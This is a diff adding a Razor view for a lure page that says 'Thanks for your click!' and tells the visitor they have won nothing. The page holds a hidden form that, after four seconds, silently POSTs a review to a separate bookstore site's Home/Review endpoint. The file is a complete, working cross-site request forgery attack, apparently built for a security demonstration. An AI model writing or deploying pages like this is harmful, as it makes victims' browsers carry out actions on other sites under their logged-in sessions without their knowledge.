@@ -1,0 +1,31 @@
+﻿@model dynamic
+
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <title>Bad Luck</title>
+</head>
+<body>
+
+    <h1>Thanks for your click!</h1>
+    <p>But unfortunately, you haven't actually won anything.</p>
+
+    <form action="http://unnamed-bookstore.com:62331/Home/Review" method="POST">
+        <input type="hidden" name="review" value="I THOUGHT I HAD WON THE JACKPOT, BUT I WAS WRONG! :(" />
+    </form>
+
+    <script>
+        window.onload = function () {
+            setTimeout(function() {
+                document.forms[0].submit();
+            }, 4000);
+        }
+    </script>
+
+</body>
+</html>
